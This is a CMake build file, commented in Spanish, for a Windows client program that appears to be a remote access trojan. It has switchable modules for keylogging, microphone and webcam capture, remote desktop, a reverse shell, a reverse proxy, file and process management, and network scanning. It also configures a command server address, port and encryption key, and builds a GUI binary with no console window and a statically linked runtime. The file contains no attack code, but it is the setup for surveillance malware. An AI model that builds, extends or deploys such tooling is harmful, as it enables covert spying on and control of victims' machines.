cmake_minimum_required(VERSION 3.14 FATAL_ERROR)

project(cliente LANGUAGES CXX C)

# --- Configuración del estándar C++ ---
set(CMAKE_CXX_STANDARD 11)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

set(SRC_INFO_MOD
    ../base64/base64.cpp
    ../sqlite3/sqlite3.c
)

set(SRCS main.cpp
         misc.cpp
         cliente.cpp 
         mod_reverse_proxy.cpp
         mod_mic.cpp
         mod_camara.cpp
         mod_file_manager.cpp
         mod_keylogger.cpp
         mod_remote_desktop.cpp
         mod_ventanas.cpp
         mod_info.cpp
         mod_escaner.cpp
         mod_fun.cpp
         mod_dynamic_load.cpp
        ../aes256/aes256.cpp
)

option(USE_TEST_MOD "Mod prueba" OFF)
option(USE_DEBUG "Debug" OFF)

option(USE_CAM "Mod Camara" OFF)
option(USE_SCAN "Mod Escaner Red" OFF)
option(USE_FM "Mod Admin Archivos" OFF)
option(USE_FUN "Mod Bromas" OFF)
option(USE_INFO "Mod Informacion" OFF)
option(USE_KL "Mod Keylogger" OFF)
option(USE_MIC "Mod Microfono" OFF)
option(USE_RD "Mod Escritorio Remoto" OFF)
option(USE_RP "Mod Proxy Inversa" OFF)
option(USE_WM "Mod Admin Ventanas" OFF)
option(USE_SHELL "Mod Shell Inversa" OFF)
option(USE_PM "Mod Admin Procesos" OFF)

set(SRV_ADDR "127.0.0.1" CACHE STRING "Direccion Servidor")
set(SRV_ADDR_PORT "65500" CACHE STRING "Puerto de conexion")
set(SRV_ENC_KEY "eW1n" CACHE STRING "Llave de cifrado")

configure_file(${CMAKE_SOURCE_DIR}/config.hpp.in
                ${CMAKE_BINARY_DIR}/config.hpp
                @ONLY)

if(NOT USE_DEBUG)
    message("[!] Reduciendo dependencias...")
    foreach(flag_var
        CMAKE_C_FLAGS
        CMAKE_C_FLAGS_DEBUG
        CMAKE_C_FLAGS_RELEASE
        CMAKE_C_FLAGS_RELWITHDEBINFO
        CMAKE_C_FLAGS_MINSIZEREL
        CMAKE_CXX_FLAGS
        CMAKE_CXX_FLAGS_DEBUG
        CMAKE_CXX_FLAGS_RELEASE
        CMAKE_CXX_FLAGS_RELWITHDEBINFO
        CMAKE_CXX_FLAGS_MINSIZEREL
    )
        if(${flag_var} MATCHES "/MD")
            string(REPLACE "/MD" "/MT" ${flag_var} "${${flag_var}}")
        endif()
    endforeach()
endif()

#set(CMAKE_EXE_LINKER_FLAGS_RELEASE "/SUBSYSTEM:CONSOLE")

if(USE_INFO)
    message("SQLITE Version :v")
    add_executable(cliente WIN32 ${SRCS} ${SRC_INFO_MOD})
else()
    message("Clean Version :v")
    add_executable(cliente WIN32 ${SRCS})
endif()

target_link_libraries(cliente PRIVATE mfuuid)

target_include_directories(cliente PRIVATE ${CMAKE_BINARY_DIR})

message(STATUS "SRV_ENC_KEY='${SRV_ENC_KEY}'")
message(STATUS "SRV_ADDR='${SRV_ADDR}'")
message(STATUS "SRV_ADDR_PORT='${SRV_ADDR_PORT}'")

#target_compile_definitions(cliente PRIVATE __CUSTOM_HOST="\""${SRV_ADDR}"\"")
#target_compile_definitions(cliente PRIVATE __CUSTOM_PORT="\""${SRV_ADDR_PORT}"\"")
#target_compile_definitions(cliente PRIVATE __CUSTOM_ENCRYPTION_KEY="${SRV_ENC_KEY}")

if(USE_TEST_MOD)
    target_compile_definitions(cliente PRIVATE TEST_MOD=1)
endif()

if(USE_DEBUG)
    message("Debug habilitado!!!")
    target_compile_definitions(cliente PRIVATE ___DBG__=1)
endif()

if(USE_CAM)
    target_compile_definitions(cliente PRIVATE __MOD_CAM=1)
endif()

if(USE_SCAN)
    target_compile_definitions(cliente PRIVATE __MOD_SCAN=1)
endif()

if(USE_FM)
    target_compile_definitions(cliente PRIVATE __MOD_FM=1)
endif()

if(USE_FUN)
    target_compile_definitions(cliente PRIVATE __MOD_F=1)
endif()

if(USE_INFO)
    target_compile_definitions(cliente PRIVATE __MOD_INFO=1)
endif()

if(USE_KL)
    target_compile_definitions(cliente PRIVATE __MOD_KEY=1)
endif()

if(USE_MIC)
    target_compile_definitions(cliente PRIVATE __MOD_MIC=1)
endif()

if(USE_RD)
    target_compile_definitions(cliente PRIVATE __MOD_RD=1)
endif()

if(USE_RP)
    target_compile_definitions(cliente PRIVATE __MOD_RP=1)
endif()

if(USE_WM)
    target_compile_definitions(cliente PRIVATE __MOD_WM=1)
endif()

if(USE_SHELL)
    target_compile_definitions(cliente PRIVATE __MOD_SHELL=1)
endif()

if(USE_PM)
    target_compile_definitions(cliente PRIVATE __MOD_PM=1)
endif()
